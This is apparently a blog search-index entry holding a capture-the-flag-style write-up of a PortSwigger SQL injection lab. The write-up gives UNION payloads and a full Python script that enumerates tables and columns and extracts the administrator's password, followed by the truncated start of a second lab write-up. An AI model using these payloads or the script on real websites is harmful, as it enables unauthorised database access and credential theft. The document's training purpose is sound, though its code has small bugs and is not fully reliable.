    "http:\/\/localhost:1313\/portswigger\/sqli_lab_8\/": {
        "title": "SQLi Vulnerabilities: Lab 8: SQL injection attack, listing the database contents on non-Oracle databases",
        "tags": ["WebSecurity","PortSwigger","web-exploitation","security-research","portswigger-labs","ctf-writeup","injection","sql","sqli","python","UNION",],
        "content": "Lab 8: SQL injection attack, listing the database contents on non-Oracle databases: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application\u0026rsquo;s response so you can use a UNION attack to retrieve data from other tables.\nThe application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.\nTo solve the lab, log in as the administrator user.\nInitial Reconnaissance/Discovery: We are given access to a simple web application which allows us to filter categories of products using the filters on the page, there is also a \u0026ldquo;Home\u0026rdquo; \u0026amp; \u0026ldquo;My Account\u0026rdquo; section, the latter we can use to login.\nWe already know the \u0026ldquo;category\u0026rdquo; parameter is vulnerable based on the previous lab however let\u0026rsquo;s re-verify this.\nEstablishing SQLi: If we send request to repeater we can inject a single quote ' after the parameter and see we trigger a 500 response. If then add a single another quote we can see that the page returns a 200 OK response. Inferring The SQL Query Being Run: Looking at the way the page we returns information can infer the query being run is similar to the below.\nSELECT * FROM products WHERE category = \u0026#39;Pets\u0026#39; AND [rest of query] When we add our single quote it becomes the below which is syntactically incorrect.\nSELECT * FROM products WHERE category = \u0026#39;Pets\u0026#39;\u0026#39; AND [rest of query] However when we add another quote it becomes the below, closing off the first quotation mark we provided.\nSELECT * FROM products WHERE category = \u0026#39;Pets\u0026#39;\u0026#39;\u0026#39; AND [rest of query] UNION SELECT Requirements: As the lab wants us to display data we will need a way to output that data and the simplest way to retrieve data would be using a UNION SELECT query. This will allow us to display the output of our query\u0026rsquo;s amongst the legitimate data. However in order for us to do this we need to ensure that the two requirements for this attack are met:\nThe queries must return the same amount of columns: This means that if the original query that is searching the database returns 5 columns our UNION query must also return 5 columns.\nTo solve this issue: We will enumerate the number of columns being returned by the original query. The data types in the columns must be compatible with each query: This means that if the table is returning strings such as item names in column 1 our UNION query has to also return strings or a compatible data type.\nTo solve this issue: Initially we will use a simple method of returning NULL values. This is because NULL is convertible/compatible to every data type, so it will mean that the payload should succeed. Once we have established our column count we will then start enumerating the data type of the columns \u0026amp; eventually extract data. Establishing The Number Of Columns Using UNION SELECT Statement: Using Burp: In order for us to display data we need to establish how many columns are in the existing database.\nIf we return back to repeater we can enter the payload.\n\u0026#39; UNION SELECT NULL-- We then select the payload \u0026amp; press CTRL+U to URL encode it, however this won\u0026rsquo;t work. The reason being is that this is database is running MySQL and MySQL comments +require+ a space after the comment symbol. So we need to add an additional space so by using a + symbol or we can just use the # symbol instead. If we send this payload we get a 500 response meaning the number of columns is not correct, so add another NULL so our payload and repeat the process.\n\u0026#39; UNION SELECT NULL,NULL-- This time we get a 200 response telling us there are 2 columns in the table. Using Python: As usual I am going to show how this can also be solved using Python.\nPrep The Certificate: If you want to proxy traffic through burp this is mandatory.\nOpen burp\u0026rsquo;s in built web browser and go to http://burpsuite \u0026amp; download the certificate by clicking on “CA Certificate” button on the top right corner. Convert the certificate to the .pem format so the python requests module can use it.\nopenssl x509 -inform der -in certificate.cer -out certificate.pem Imports: First we import the modules we will need, requests \u0026amp; os. We also suppress the requests warning that will show.\nimport requests import os requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) If we didn\u0026rsquo;t suppress the warnings the output would look like this. Proxy Setup: Now we declare our proxy so we can push all our traffic through burp, we also pass in the converted certificate.\nproxy = \u0026#39;http://127.0.0.1:8080\u0026#39; os.environ[\u0026#39;HTTP_PROXY\u0026#39;] = proxy os.environ[\u0026#39;HTTPS_PROXY\u0026#39;] = proxy os.environ[\u0026#39;REQUESTS_CA_BUNDLE\u0026#39;] = \u0026#34;certificate.pem\u0026#34; Variable Declaration: Proxies \u0026amp; URL:\nWe declare an array of proxies to proxy our requests through as well as the unique url \u0026amp; category endpoint. +Note+: The category and URL vary from instance to instance.\nproxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} url=\u0026#34;https://0a1c00bc04d88495826a8ad7007a0000.web-security-academy.net/filter?category=Pets\u0026#34; SQL Syntax \u0026amp; Counters:\nSo now we have our payload broken up into various elements, the reason for this is because we don\u0026rsquo;t want to just supply a list of multiple UNION SELECT statements, doing it this way offers more flexibility as well as ensuring we don\u0026rsquo;t repeat ourselves, it also means we could check databases with thousands of columns and it would still work.(I wouldn\u0026rsquo;t advise that but you could)\nunion=\u0026#34;\u0026#39; UNION SELECT \u0026#34; comma=\u0026#34;,\u0026#34; nullPayload=\u0026#34;NULL\u0026#34; comment=\u0026#34;-- \u0026#34; additionalNull=comma+nullPayload payload=union+nullPayload counter=2 We also create a counter variable and set it to 2. This counter is used to track how many NULL values (columns) are in our UNION SELECT payload as we build it. Our starting payload is:\npayload = union + nullPayload # \u0026#34;\u0026#39; UNION SELECT NULL\u0026#34; So before the loop runs we already have one NULL in the query. Inside the loop, we keep appending more ,NULL values to payload and update counter to reflect the number of columns.\nWe don’t start the counter at 0 because SQL columns are conceptually counted from 1 (first column, second column etc…) and our payload already includes the first NULL column. If we started from 0, the value of counter would always lag behind the actual number of NULL columns in the query. By starting at 2, the value of counter stays aligned with the true column count once we begin adding additional NULL values in the loop.\nFor Loop With Request: We declare a for loop will which repeat for 10 total iterations.\nThen we have a try block which will send our get request to the url with payload \u0026amp; comment.\nResponse Monitoring: We then monitor the responses and if the value \u0026ldquo;Home\u0026rdquo; is found in the body of the response we will:\nPrint the string \u0026quot;Valid payload {payload}-- there are {counter} columns.\u0026quot; which will contain the actual payload as well as the number of columns. Print the full Lab URL including comment and payload so we can easily verify it in a browser. If these above conditions are met it will break out of the loop and stop the process.\nIf the above is not found it will add an additional NULL value using the additionalNull variable to the payload \u0026amp; increment the counter by 1 and continue.\nfor i in range(10): try: request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3) if \u0026#39;Home\u0026#39; in request.text: print(\u0026#34;---\u0026#34;) print(f\u0026#34;Valid payload {payload}-- there are {counter} columns.\u0026#34;) print(f\u0026#34;Lab Url: {url+payload+comment}\u0026#34;) print(\u0026#34;---\u0026#34;) break payload=payload+additionalNull counter+=i Error Handling: These except clauses are used for error handling to ensure if an error is encountered they are logged to the terminal and the process continues.\nexcept requests.exceptions.HTTPError as errh: print (\u0026#34;Http Error:\u0026#34;,errh) except requests.exceptions.ConnectionError as errc: print (\u0026#34;Error Connecting:\u0026#34;,errc) except requests.exceptions.Timeout as errt: print (\u0026#34;Timeout Error:\u0026#34;,errt) except requests.exceptions.RequestException as err: print (\u0026#34;OOps: Something Else\u0026#34;,err) Full Script: #!/usr/bin/env python3 import requests import os import urllib.parse requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) proxy = \u0026#39;http://127.0.0.1:8080\u0026#39; os.environ[\u0026#39;HTTP_PROXY\u0026#39;] = proxy os.environ[\u0026#39;HTTPS_PROXY\u0026#39;] = proxy os.environ[\u0026#39;REQUESTS_CA_BUNDLE\u0026#39;] = \u0026#34;certificate.pem\u0026#34; proxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} url=\u0026#34;https://0a1c00bc04d88495826a8ad7007a0000.web-security-academy.net/filter?category=Pets\u0026#34; union=\u0026#34;\u0026#39; UNION SELECT \u0026#34; comma=\u0026#34;,\u0026#34; nullPayload=\u0026#34;NULL\u0026#34; comment=\u0026#34;-- \u0026#34; additionalNull=comma+nullPayload payload=union+nullPayload counter=2 for i in range(10): try: request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3) if \u0026#39;Home\u0026#39; in request.text: print(\u0026#34;---\u0026#34;) print(f\u0026#34;Valid payload {payload}-- there are {counter} columns.\u0026#34;) print(f\u0026#34;Lab Url: {url+payload+comment}\u0026#34;) print(\u0026#34;---\u0026#34;) payload=payload+additionalNull counter+=i except requests.exceptions.HTTPError as errh: print (\u0026#34;Http Error:\u0026#34;,errh) except requests.exceptions.ConnectionError as errc: print (\u0026#34;Error Connecting:\u0026#34;,errc) except requests.exceptions.Timeout as errt: print (\u0026#34;Timeout Error:\u0026#34;,errt) except requests.exceptions.RequestException as err: print (\u0026#34;OOps: Something Else\u0026#34;,err) Running The Script: As we can see it tells what we expect, there are 2 columns and the correction payload is:\n\u0026#39; UNION SELECT NULL,NULL-- Establishing Column Data Type VIA UNION SELECT Statement: Using Burp: Much like how we established the number of columns we can use repeater to determine the column data type.\nWe know to pass the lab we need to extract the administrators username \u0026amp; password in a single column, then login. Typically usernames and passwords would be a string data type in the database. So to enumerate this we will systematically start replacing the NULL values of our payload with the string values 'a'. This means our payload becomes:\n\u0026#39;+UNION+SELECT+\u0026#39;a\u0026#39;,NULL-- \u0026#39;+UNION+SELECT+NULL,\u0026#39;a\u0026#39;-- \u0026#39;+UNION+SELECT+\u0026#39;a\u0026#39;,\u0026#39;a\u0026#39;-- As we can the first column is compatible with the string datatype as we get a 200 response. We now modify our payload so the string value is in the second NULL position and revert the first position to be NULL again.\n\u0026#39;+UNION+SELECT+NULL,\u0026#39;a\u0026#39;-- We can see this worked and the second position is also compatible with the string datatype. Using Python: We can also do this in python by adding to our initial script. I have placed this in a diff block so you can see what we have added.\n+compatible=0 for i in range(10): try: request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3) if \u0026#39;Home\u0026#39; in request.text: print(\u0026#34;---\u0026#34;) print(f\u0026#34;Valid payload {payload}-- there are {counter} columns.\u0026#34;) print(f\u0026#34;Lab Url: {url+payload+comment}\u0026#34;) print(\u0026#34;---\u0026#34;) + payloadList=[nullPayload] * counter + for y in range(len(payloadList)): + if payloadList[y] == \u0026#34;NULL\u0026#34;: + payloadList[y] = \u0026#34;\u0026#39;string\u0026#39;\u0026#34; + newPayload=(\u0026#34;,\u0026#34;.join(payloadList)) + request=requests.get(url + union + newPayload + comment, proxies=proxies, verify=False, timeout=3) + if \u0026#39;Home\u0026#39; in request.text: + print(f\u0026#34;Compatible data type found {union+newPayload+comment}\u0026#34;) + compatible+=1 + if compatible \u0026gt; 1: + print(f\u0026#34;{compatible} compatible data type columns found, suggest combining payloads\u0026#34;) + payloadList[y] = \u0026#34;NULL\u0026#34; payload=payload+additionalNull counter+=i Compatible Variable: This is going to be used later on to print out a specific message if we find more than 1 compatible data type column so at the moment we set this with a value of 0.\ncompatible=0 List Creation: We then create a payloadList that\u0026rsquo;s contents is the value of nullPayload (which is \u0026ldquo;NULL\u0026rdquo;) and this is equal to the value of the counter so if the counter is 2 then the list value is ['NULL', 'NULL']\npayloadList=[nullPayload] * counter List Iteration:\nif payloadList[y] == \u0026#34;NULL\u0026#34;: payloadList[y] = \u0026#34;\u0026#39;string\u0026#39;\u0026#34; We now iterate through the length of the list and if the value of y in the list is equal to NULL (which it will be) we replace that with the with a string called string. So on the first run it would ['string', NULL].\nNew Payload Creation:\nnewPayload=(\u0026#34;,\u0026#34;.join(payloadList)) We then join our list together into a string so we can pass this to our request later, and we ensure we separate with a comma , other wise our payload would be \u0026quot;'string'NULLNULL\u0026quot;\nSend our Request:\nrequest=requests.get(url + union + newPayload + comment, proxies=proxies, verify=False, timeout=3) if \u0026#39;Home\u0026#39; in request.text: print(f\u0026#34;Compatible data type found {union+newPayload+comment}\u0026#34;) Next we send our request like before but this time we are using our new payload. We also need to ensure we send the \u0026quot;union\u0026quot; variable as this is not currently present in our list/string/payloadstring.\nWe also perform the same type of check in the body of the request for the string \u0026ldquo;Home\u0026rdquo; which will signify that we have had a 200 OK response, and in this event it will print out the payload.\nCompatible Logic Counter: If the above conditions are met we increment our compatible counter by 1. We then perform a check if the counter is greater than 1 and if it is we print out the total number of compatible data types found and suggest the user combine the payloads.\ncompatible+=1 if compatible \u0026gt; 1: print(f\u0026#34;{compatible} compatible data type columns found, suggest combining payloads\u0026#34;) Reset The NULL Value:\npayloadList[y] = \u0026#34;NULL\u0026#34; In the event that we do not get a 200 response we rest the list position y to be NULL again as other wise the list would just be full of the lab string.\nAs we can see when we run the script it prints out the compatible data type fields in position 1 \u0026amp; 2 and also suggests we combine the payloads as they are both valid. Enumerating The Database Type By Using VIA UNION SELECT Statement: In order for us to enumerate the tables we need to enumerate what type of database is currently in use.\nWe can easily query the database type by using any of the below payloads:\n--Oracle Pyaloads \u0026#39; UNION SELECT NULL,SELECT banner FROM v$version-- \u0026#39; UNION SELECT NULL,version FROM v$instance-- --Microsoft Payloads \u0026#39; UNION SELECT NULL,SELECT @@version-- --PostgreSQL Payload \u0026#39; UNION SELECT NULL,version()-- --MySQL Payload \u0026#39; UNION SELECT NULL,@@version-- Using Burp: As we can see this database is a PostgreSQL database as the payload ' UNION SELECT NULL,version()-- is valid. Using Python: We can also add a function to our script to check for the version.\ndef extractSQLVersion(): sqlVersionPayload=[\u0026#34;\u0026#39; UNION SELECT NULL,SELECT banner FROM v$version--\u0026#34;, \u0026#34;\u0026#39; UNION SELECT NULL,version FROM v$instance-- \u0026#34;, \u0026#34;\u0026#39; UNION SELECT NULL,SELECT @@version-- \u0026#34;, \u0026#34;\u0026#39; UNION SELECT NULL,version()--\u0026#34;, ] for versionPayload in sqlVersionPayload: request=requests.get(url + versionPayload, proxies=proxies, verify=False, timeout=3) if \u0026#34;Home\u0026#34; in request.text: print(\u0026#34;-\u0026#34;*10) print(f\u0026#34;200 Response for payload: {versionPayload}\u0026#34;) if versionPayload == sqlVersionPayload[0] or versionPayload == sqlVersionPayload[1]: print (\u0026#34;Database is an Oracle Database\u0026#34;) if versionPayload == sqlVersionPayload[2]: print(\u0026#34;Database is a MySQL or MSSQL Database\u0026#34;) else: print(\u0026#34;Database is a PostgreSQL Database\u0026#34;) return False Define Our Function: First we define our function.\ndef extractSQLVersion(): Define Our Version Enumeration Payloads: We then need to provide a list containing our payloads.\nsqlVersionPayload=[\u0026#34;\u0026#39; UNION SELECT NULL,SELECT banner FROM v$version--\u0026#34;, \u0026#34;\u0026#39; UNION SELECT NULL,version FROM v$instance-- \u0026#34;, \u0026#34;\u0026#39; UNION SELECT NULL,SELECT @@version-- \u0026#34;, \u0026#34;\u0026#39; UNION SELECT NULL,version()--\u0026#34;, ] Iterate Through Payloads \u0026amp; Send Requests: Now we iterate through our list of payloads and send these with our request.\nfor versionPayload in sqlVersionPayload: request=requests.get(url + versionPayload, proxies=proxies, verify=False, timeout=3) Parse Response \u0026amp; Return Valid Payloads: We parse the response of the request for the home keyword as this is present on all pages signifying a 200 response. We then print out the payload and then check the payload position against our list so we can return the SQL database type to the user.\nif \u0026#34;Home\u0026#34; in request.text: print(\u0026#34;-\u0026#34;*10) print(f\u0026#34;200 Response for payload: {versionPayload}\u0026#34;) if versionPayload == sqlVersionPayload[0] or versionPayload == sqlVersionPayload[1]: print (\u0026#34;Database is an Oracle Database\u0026#34;) if versionPayload == sqlVersionPayload[2]: print(\u0026#34;Database is a MySQL or MSSQL Database\u0026#34;) else: print(\u0026#34;Database is a PostgreSQL Database\u0026#34;) Integrate Into Existing Script: We now trigger it to run if a compatible column data type is found.\nif \u0026#39;Home\u0026#39; in request.text: print(f\u0026#34;Compatible data type found {union+newPayload+comment}\u0026#34;) compatible+=1 + if compatible \u0026gt; 1: print(f\u0026#34;{compatible} compatible data type columns found, suggest combining payloads\u0026#34;) + extractSQLVersion() payloadList[y] = \u0026#34;NULL\u0026#34; As we can see it works and we are informed it\u0026rsquo;s a PostgreSQL database. Enumerating Table Names VIA UNION SELECT Statement: Using Burp: As we can see we can pull the table by querying the information schema.\n\u0026#39; UNION SELECT NULL, table_name FROM information_schema.tables-- Using Python: We can add the below function to check the table names.\ndef extractSQLTableNames(): sqlPayload=\u0026#34;\u0026#39; UNION SELECT NULL, table_name FROM information_schema.tables--\u0026#34; request=requests.get(url + sqlPayload, proxies=proxies, verify=False, timeout=3) response=request.text if \u0026#34;user\u0026#34; in response or \u0026#34;password\u0026#34; in response: soup = BeautifulSoup(request.text, \u0026#39;html.parser\u0026#39;) usersTable = soup.find(string=re.compile(r\u0026#39;^users\u0026#39;)) passwordTable = soup.find(string=re.compile(r\u0026#39;^pass\u0026#39;)) print(\u0026#34;-\u0026#34;*10) print(f\u0026#34;The users table is called {usersTable}.\u0026#34;) return usersTable Define Our Function: First we define our function.\ndef extractSQLTableNames(): Define Our Version Payload: We then need to provide a ourpayload.\nsqlPayload=\u0026#34;\u0026#39; UNION SELECT NULL, table_name FROM information_schema.tables--\u0026#34; Send Our Request: We are only sending one request here. We also return the response in text so it\u0026rsquo;s easier to parse.\nrequest=requests.get(url + sqlPayload, proxies=proxies, verify=False, timeout=3) response=request.txt Parse Response \u0026amp; Return Valid Payloads: We parse the response of the request for the \u0026ldquo;user\u0026rdquo; keyword as this will signify that the table name is present on the page.\nWe then extract the users table name using a regular expression and print it to the console.\nif \u0026#34;user\u0026#34; in response: soup = BeautifulSoup(request.text, \u0026#39;html.parser\u0026#39;) usersTable = soup.find(string=re.compile(r\u0026#39;^users\u0026#39;)) print(\u0026#34;-\u0026#34;*10) print(f\u0026#34;The users table is called {usersTable}.\u0026#34;) Return usersTable Value: We will need this value later in order to progress the script so let\u0026rsquo;s return it now.\nreturn usersTable Integrate Into Existing Script: We now trigger it to run after our previous function call.\nif \u0026#39;Home\u0026#39; in request.text: print(f\u0026#34;Compatible data type found {union+newPayload+comment}\u0026#34;) compatible+=1 if compatible \u0026gt; 1: print(f\u0026#34;{compatible} compatible data type columns found, suggest combining payloads\u0026#34;) extractSQLVersion() + usersTable = extractSQLTableNames() payloadList[y] = \u0026#34;NULL\u0026#34; As we can see it works: Enumerating Column Names VIA UNION SELECT Statement: Now that we have the table name we need to extract the column names so we can pull data.\nUsing Burp: Using burp we can use the below UNION SELECT query to do so.\n\u0026#39; UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=\u0026#39;users_tisklo\u0026#39;-- We can see there are two columns in the table password_wnpado \u0026amp; username_ktucxg.\nUsing Python: We do this using the below function in python.\ndef extractSQLColumnNames(usersTable): sqlPayload=f\u0026#34;\u0026#39; UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=\u0026#39;{usersTable}\u0026#39;--\u0026#34; request=requests.get(url + sqlPayload, proxies=proxies, verify=False, timeout=3) response=request.text if \u0026#34;user\u0026#34; in response or \u0026#34;password\u0026#34; in response: soup = BeautifulSoup(request.text, \u0026#39;html.parser\u0026#39;) usersColumn = soup.find(string=re.compile(r\u0026#39;username\u0026#39;)) passwordColumn = soup.find(string=re.compile(r\u0026#39;^pass\u0026#39;)) print(f\u0026#34;The users column is called {usersColumn} \u0026amp; the password table is called {passwordColumn}\u0026#34;) return(usersColumn,passwordColumn) Define Our Function: First we define our function with one argument, the usersTable value we extracted earlier.\ndef extractSQLColumnNames(usersTable): Define Our Version Payload: We then need to provide a ourpayload which includes the usersTable value.\nsqlPayload=f\u0026#34;\u0026#39; UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=\u0026#39;{usersTable}\u0026#39;--\u0026#34; Send Our Request: We are only sending one request here. We also return the response in text so it\u0026rsquo;s easier to parse.\nrequest=requests.get(url + sqlPayload, proxies=proxies, verify=False, timeout=3) response=request.text Parse Response \u0026amp; Return Valid Payloads: We parse the response of the request for the \u0026ldquo;user\u0026rdquo; or \u0026ldquo;password\u0026rdquo; keywords as this will signify that the column names are present on the page.\nWe then extract the user \u0026amp; columns name\u0026rsquo;s using a regular expression and print it to the console.\nif \u0026#34;user\u0026#34; in response or \u0026#34;password\u0026#34; in response: soup = BeautifulSoup(request.text, \u0026#39;html.parser\u0026#39;) usersColumn = soup.find(string=re.compile(r\u0026#39;username\u0026#39;)) passwordColumn = soup.find(string=re.compile(r\u0026#39;^pass\u0026#39;)) print(\u0026#34;-\u0026#34;*10) print(f\u0026#34;The users column is called {usersColumn} \u0026amp; the password table is called {passwordColumn}\u0026#34;) Return Values: Again we will need these returned values for future use.\nreturn(usersColumn,passwordColumn) Integrate Into Existing Script: We now trigger it to run after our previous function call.\nif \u0026#39;Home\u0026#39; in request.text: print(f\u0026#34;Compatible data type found {union+newPayload+comment}\u0026#34;) compatible+=1 if compatible \u0026gt; 1: print(f\u0026#34;{compatible} compatible data type columns found, suggest combining payloads\u0026#34;) extractSQLVersion() usersTable = extractSQLTableNames() + usersColumn, passwordColumn = extractSQLColumnNames(usersTable) payloadList[y] = \u0026#34;NULL\u0026#34; As we can see it works: Extracting Data From The Table VIA UNION SELECT Statement: Now we know the names of the columns we can extract data.\nUsing Burp: \u0026#39; UNION SELECT NULL, username_ktucxg||\u0026#39;:\u0026#39;||password_wnpado FROM users_tisklo-- We have the administrator username and password so we can login and solve the lab. Using Python: We can extract the administrator password using python also.\ndef extractSQLusers(usersColumn,passwordColumn,usersTable): sqlPayload=f\u0026#34;\u0026#39; UNION SELECT NULL, {usersColumn}||\u0026#39;:\u0026#39;||{passwordColumn} FROM {usersTable}--\u0026#34; request=requests.get(url + sqlPayload, proxies=proxies, verify=False, timeout=3) response=request.text if \u0026#34;administrator\u0026#34; in response: soup = BeautifulSoup(request.text, \u0026#39;html.parser\u0026#39;) administratorPass = soup.find(string=re.compile(r\u0026#39;^administrator:\u0026#39;)) print(\u0026#34;-\u0026#34;*10) print(f\u0026#34;[+]: The administrator credentials are: {administratorPass}\u0026#34;) return True Define Our Function: First we define our function with three arguments, as we need to pass the usersColumn,passwordColumn,usersTable values.\ndef extractSQLusers(usersColumn,passwordColumn,usersTable): Define Our Version Payload: We then need to provide a ourpayload which includes the usersTable \u0026amp; the usersColumn \u0026amp; passwordColumn values.\nsqlPayload=f\u0026#34;\u0026#39; UNION SELECT NULL, {usersColumn}||\u0026#39;:\u0026#39;||{passwordColumn} FROM {usersTable}--\u0026#34; Send Our Request: We are only sending one request here. We also return the response in text so it\u0026rsquo;s easier to parse.\nrequest=requests.get(url + sqlPayload, proxies=proxies, verify=False, timeout=3) response=request.text Parse Response \u0026amp; Return Valid Payloads: We parse the response of the request for the \u0026ldquo;administrator\u0026rdquo; keyword as this will signify that the credentials are present.\nWe then extract the this value and print it to the console.\nif \u0026#34;administrator\u0026#34; in response: soup = BeautifulSoup(request.text, \u0026#39;html.parser\u0026#39;) administratorPass = soup.find(string=re.compile(r\u0026#39;^administrator:\u0026#39;)) print(\u0026#34;-\u0026#34;*10) print(f\u0026#34;[+]: The administrator credentials are: {administratorPass}\u0026#34;) return True Integrate Into Existing Script: We now trigger it to run after our previous function call.\nif \u0026#39;Home\u0026#39; in request.text: print(f\u0026#34;Compatible data type found {union+newPayload+comment}\u0026#34;) compatible+=1 if compatible \u0026gt; 1: print(f\u0026#34;{compatible} compatible data type columns found, suggest combining payloads\u0026#34;) extractSQLVersion() usersTable = extractSQLTableNames() usersColumn, passwordColumn = extractSQLColumnNames(usersTable) + extractUsers = extractSQLusers(usersColumn, passwordColumn, usersTable) payloadList[y] = \u0026#34;NULL\u0026#34; As we can see it works: We have the administrator username and password so we can login and solve the lab. Full Script: #!/usr/bin/env python3 import requests import os import urllib.parse requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) from bs4 import BeautifulSoup import re proxy = \u0026#39;http://127.0.0.1:8080\u0026#39; os.environ[\u0026#39;HTTP_PROXY\u0026#39;] = proxy os.environ[\u0026#39;HTTPS_PROXY\u0026#39;] = proxy os.environ[\u0026#39;REQUESTS_CA_BUNDLE\u0026#39;] = \u0026#34;certificate.pem\u0026#34; proxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} url=\u0026#34;https://0ab300fc03dd9d51808ee9e5003c002f.web-security-academy.net/filter?category=Gifts\u0026#34; union=\u0026#34;\u0026#39; UNION SELECT \u0026#34; comma=\u0026#34;,\u0026#34; nullPayload=\u0026#34;NULL\u0026#34; comment=\u0026#34;--\u0026#34; additionalNull=comma+nullPayload payload=union+nullPayload counter=2 compatible=0 #usersTable=\u0026#34;\u0026#34; def extractSQLVersion(): sqlVersionPayload=[\u0026#34;\u0026#39; UNION SELECT NULL,SELECT banner FROM v$version--\u0026#34;, \u0026#34;\u0026#39; UNION SELECT NULL,version FROM v$instance-- \u0026#34;, \u0026#34;\u0026#39; UNION SELECT NULL,SELECT @@version-- \u0026#34;, \u0026#34;\u0026#39; UNION SELECT NULL,version()--\u0026#34;, ] for versionPayload in sqlVersionPayload: request=requests.get(url + versionPayload, proxies=proxies, verify=False, timeout=3) if \u0026#34;Home\u0026#34; in request.text: print(\u0026#34;-\u0026#34;*10) print(f\u0026#34;200 Response for payload: {versionPayload}\u0026#34;) if versionPayload == sqlVersionPayload[0] or versionPayload == sqlVersionPayload[1]: print (\u0026#34;Database is an Oracle Database\u0026#34;) if versionPayload == sqlVersionPayload[2]: print(\u0026#34;Database is a MySQL or MSSQL Database\u0026#34;) else: print(\u0026#34;Database is a PostgreSQL Database\u0026#34;) return False def extractSQLTableNames(): sqlPayload=\u0026#34;\u0026#39; UNION SELECT NULL, table_name FROM information_schema.tables--\u0026#34; request=requests.get(url + sqlPayload, proxies=proxies, verify=False, timeout=3) response=request.text if \u0026#34;user\u0026#34; in response: soup = BeautifulSoup(request.text, \u0026#39;html.parser\u0026#39;) usersTable = soup.find(string=re.compile(r\u0026#39;^users\u0026#39;)) print(\u0026#34;-\u0026#34;*10) print(f\u0026#34;The users table is called {usersTable}.\u0026#34;) return usersTable def extractSQLColumnNames(usersTable): sqlPayload=f\u0026#34;\u0026#39; UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=\u0026#39;{usersTable}\u0026#39;--\u0026#34; request=requests.get(url + sqlPayload, proxies=proxies, verify=False, timeout=3) response=request.text if \u0026#34;user\u0026#34; in response or \u0026#34;password\u0026#34; in response: soup = BeautifulSoup(request.text, \u0026#39;html.parser\u0026#39;) usersColumn = soup.find(string=re.compile(r\u0026#39;username\u0026#39;)) passwordColumn = soup.find(string=re.compile(r\u0026#39;^pass\u0026#39;)) print(\u0026#34;-\u0026#34;*10) print(f\u0026#34;The users column is called {usersColumn} \u0026amp; the password table is called {passwordColumn}\u0026#34;) return(usersColumn,passwordColumn) def extractSQLusers(usersColumn,passwordColumn,usersTable): sqlPayload=f\u0026#34;\u0026#39; UNION SELECT NULL, {usersColumn}||\u0026#39;:\u0026#39;||{passwordColumn} FROM {usersTable}--\u0026#34; request=requests.get(url + sqlPayload, proxies=proxies, verify=False, timeout=3) response=request.text if \u0026#34;administrator\u0026#34; in response: soup = BeautifulSoup(request.text, \u0026#39;html.parser\u0026#39;) administratorPass = soup.find(string=re.compile(r\u0026#39;^administrator:\u0026#39;)) print(\u0026#34;-\u0026#34;*10) print(f\u0026#34;[+]: The administrator credentials are: {administratorPass}\u0026#34;) return True for i in range(10): try: request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3) if \u0026#39;Home\u0026#39; in request.text: print(\u0026#34;-\u0026#34;*10) print(f\u0026#34;Valid payload {payload}-- there are {counter} columns.\u0026#34;) print(f\u0026#34;Lab Url: {url+payload+comment}\u0026#34;) print(\u0026#34;-\u0026#34;*10) payloadList=[nullPayload] * counter for y in range(len(payloadList)): if payloadList[y] == \u0026#34;NULL\u0026#34;: payloadList[y] = \u0026#34;\u0026#39;string\u0026#39;\u0026#34; newPayload=(\u0026#34;,\u0026#34;.join(payloadList)) request=requests.get(url + union + newPayload + comment, proxies=proxies, verify=False, timeout=3) if \u0026#39;Home\u0026#39; in request.text: print(f\u0026#34;Compatible data type found {union+newPayload+comment}\u0026#34;) compatible+=1 if compatible \u0026gt; 1: print(f\u0026#34;{compatible} compatible data type columns found, suggest combining payloads\u0026#34;) extractSQLVersion() usersTable = extractSQLTableNames() usersColumn, passwordColumn = extractSQLColumnNames(usersTable) extractUsers = extractSQLusers(usersColumn, passwordColumn, usersTable) payloadList[y] = \u0026#34;NULL\u0026#34; payload=payload+additionalNull counter+=i except requests.exceptions.HTTPError as errh: print (\u0026#34;Http Error:\u0026#34;,errh) except requests.exceptions.ConnectionError as errc: print (\u0026#34;Error Connecting:\u0026#34;,errc) except requests.exceptions.Timeout as errt: print (\u0026#34;Timeout Error:\u0026#34;,errt) except requests.exceptions.RequestException as err: print (\u0026#34;OOps: Something Else\u0026#34;,err) ",

        "tags": ["WebSecurity","PortSwigger","web-exploitation","security-research","portswigger-labs","ctf-writeup","injection","sql","sqli","python","UNION",],
        "content": "Lab 4: SQL injection UNION attack, finding a column containing text: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application\u0026rsquo;s response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.\nThe lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.\n+Important+: This lab is more like a continuation of SQLi lab 3 so I would recommend reading that for a grounding in what\u0026rsquo;s going on here.\nInitial Reconnaissance/Discovery: We are given access to a simple web application which allows us to filter categories of products using the filters on the page, there is also a \u0026ldquo;My account\u0026rdquo; section.\nAt the top of the page we can see the string we need to retrieve in order to solve the lab. We already know the \u0026ldquo;category\u0026rdquo; parameter is vulnerable based on the previous lab however let\u0026rsquo;s re-verify this.\nEstablishing SQLi: If we send request to repeater we can inject a single quote ' after the parameter and see we trigger a 500 Error response. If then add a single another quote we can see that the page returns a 200 OK response. Inferring The SQL Query Being Run: 